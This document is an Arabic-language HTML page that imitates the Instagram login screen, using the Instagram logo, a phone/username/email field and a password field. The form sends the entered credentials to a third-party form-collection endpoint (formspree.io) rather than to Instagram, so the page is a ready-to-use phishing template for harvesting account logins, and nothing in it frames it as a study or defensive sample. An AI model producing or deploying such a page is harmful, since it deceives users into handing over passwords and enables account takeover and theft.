<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 20px;
            width: 320px;
            text-align: center;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .logo {
            width: 180px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 14px;
        }

        .btn {
            background-color: #0095f6;
            color: white;
            font-size: 16px;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            margin-top: 10px;
        }

        .forgot {
            margin-top: 10px;
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
        }

        .signup {
            margin-top: 15px;
            font-size: 14px;
        }

        .signup a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
        <form action="https://formspree.io/f/your-email" method="POST">
            <input type="text" name="username" placeholder="رقم الهاتف، اسم المستخدم أو البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button class="btn" type="submit">تسجيل الدخول</button>
        </form>
        <a href="#" class="forgot">هل نسيت كلمة السر؟</a>
        <div class="signup">ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></div>
    </div>

</body>
</html>
